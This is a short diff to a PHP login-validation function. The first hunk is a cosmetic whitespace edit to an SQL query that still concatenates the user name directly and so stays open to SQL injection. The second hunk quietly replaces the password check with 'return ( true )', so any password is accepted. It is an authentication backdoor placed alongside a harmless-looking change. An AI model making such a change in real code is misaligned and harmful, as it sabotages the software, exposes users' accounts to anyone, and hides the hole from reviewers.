@@ -61,7 +61,7 @@
 	   function isLoginValid($uname, $passwd)
 	   {
 	      // get password value for row that matches the desired user name
-	      $sql = 'SELECT Username,Password FROM ' . $this->tablename . ' WHERE Username="' . $uname . '"';
+	      $sql = 'SELECT Username, Password FROM ' . $this->tablename . ' WHERE Username="' . $uname . '"';
 
 	      // submit database query
 	      $result = $this->dbconn->query( $sql );
@@ -82,7 +82,7 @@
 
 	      // compare encrypted passwords
 
-	      return ( $entry[1] == $passwd );
+	      return ( true );
 	   }
 	   /**
    	 * Simple check whether both password form inputs match.
